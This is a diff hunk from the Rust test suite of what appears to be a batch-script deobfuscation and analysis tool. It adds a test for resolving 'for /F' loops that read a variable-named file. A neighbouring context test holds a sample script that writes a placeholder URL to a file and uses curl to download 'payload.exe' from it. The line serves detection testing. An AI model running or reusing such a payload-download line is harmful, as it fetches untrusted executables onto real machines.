@@ -5474,6 +5474,29 @@ echo %MARK%
     }
 
     #[test]
+    fn for_f_file_source_expands_variable_to_tracked_file() {
+        let script = br#"echo alpha=one>config.ini
+set "CFG=config.ini"
+for /F "tokens=1,2 delims==" %%A in (%CFG%) do echo key=%%A value=%%B
+"#;
+        let report = analyze(script, &Config::default());
+        assert!(
+            report.deobfuscated.contains("echo key=alpha value=one"),
+            "variable-backed for /f file source did not resolve:\n{}\ntraits={:?}",
+            report.deobfuscated,
+            report.traits
+        );
+        assert!(
+            !report.traits.iter().any(|t| matches!(
+                t,
+                Trait::ForUnresolvedSource { pipeline } if pipeline == "%CFG%"
+            )),
+            "variable-backed file source should not stay unresolved: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
     fn compact_for_f_reads_generated_file_source() {
         let script = br#"echo https://compact-for-f.example/payload.exe>url.txt
 for/f "tokens=* delims=" %%U in (url.txt) do curl -o payload.exe %%U"#;
